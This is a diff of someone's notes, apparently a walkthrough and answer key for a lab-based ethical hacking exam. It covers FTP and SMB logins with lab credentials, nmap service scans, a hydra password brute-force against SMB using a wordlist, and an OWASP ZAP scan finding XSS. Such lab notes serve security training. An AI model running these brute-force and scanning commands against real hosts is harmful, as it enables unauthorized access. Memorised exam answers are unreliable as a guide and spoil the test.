@@ -80,49 +80,76 @@ type $ollers.txt
 #------------------------------#
 
 
-# ⚠️ PART III - Challenge 6  💬ANSWER: 7867721010💬
+# PART III - Challenge 6  💬ANSWER: 7867721010💬
 ftp 192.168.10.111
 ### USERNAME: nick
 ### PASSWORD: apple
 #### ~/Desktop/w_domain.txt
-ls Desktop # CONECTADO VIA FTP
-cd Desktop
-pwd
+cd Desktop # CONECTADO VIA FTP
 get w_domain.txt
-
-find . -name "w_domain.txt" # NOUTRO TERMINAL
-cd ~/Desktop
+exit
 cat w_domain.com
 ### INFO: "id":"7867721010"
 
+# ⚠️ COMANDOS IMPORTANTES
+# ftp ftp://nick:apple@192.168.10.111
+
+
+#------------------------------#
+
+
 # PART III - Challenge 7  💬ANSWER: Apache Tomcat/Coyote JSP engine 1.1💬
-# whatweb http://172.30.10.99:8080
-nmap -p 8080 172.30.10.99 -sV --open
+nmap -sT -sV --version-light -T2 --open --top-ports 200 172.30.10.99
+nmap -p 8080 -sV 172.30.10.99
 ### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1
+
+# ⚠️ COMANDOS IMPORTANTES
+# nmap -p 8080 -sV --version-light 172.30.10.99
+# nmap -p 8080 --script http-title,http-server-header 172.30.10.99
+# whatweb -a 3 http://172.30.10.99:8080
+# curl -I http://172.30.10.99:8080
+
 
 
 #------------------------------#
 
 
 # PART III - Challenge 8  💬ANSWER: EC-Council💬
-ssh Martin@192.168.10.101
+hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 smb -u -t 4 -w 3
+### INFO: [445] [smb] host: 192.168.10.101 login: Martin password: qwerty1234
+smbclient -L //192.168.10.101 -U Martin # Listar shares
 ### PASSWORD: qwerty1234
-#### C:\Users\Martin\Music\webpent.txt
-dir # CONECTADO VIA SSH
-cd Music
-dir
-type webpent.txt
+smbclient //192.168.10.101/Users -U Martin # Conectar
+### PASSWORD: qwerty1234
+
+# #### C:\Users\Martin\Music\webpent.txt
+cd Martin\Music # CONECTADO VIA SSH
+get webpent.txt
+exit
+cat webpent.txt
 ### INFO: www.moviescope.com
+
 whatweb www.moviescope.com
 ### INFO: ..., Meta-Author[EC-Council], ...
+
+# ⚠️ COMANDOS IMPORTANTES
+# ssh Martin@192.168.10.101
+# ### PASSWORD: qwerty1234
+# cd Music # CONECTADO VIA SSH
+# dir
+# type webpent.txt
+### INFO: www.moviescope.com
 
 
 #------------------------------#
 
 
-# ⚠️ PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬 && PART III - Challenge 10  💬ANSWER: Content Security Policy💬
+# PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬 && PART III - Challenge 10  💬ANSWER: Content Security Policy💬
 owasp-zap
-### Automated Run → URL to attack: https://www.goodshopping.com → Attack
+### Automated Run → URL to attack: http://www.goodshopping.com → Attack
+### Alerts → Vulnerable JS Library
+### INFO: Other Info → CVE-2020-11023, CVE-2020-11022, CVE-2015-9251 
+### INFO: Reference → https://nvd.nist.gov/vuln/detail/CVE-2012-6708 → Cross-site Scripting (XSS)   
 ### Alerts → User Controllable HTML Element Attibute (Potential XSS)
 ### INFO: Description → ... for XSS (cros-site scripting) ... 
 ### Alerts → Content Security Policy (CSP) Header Not Set
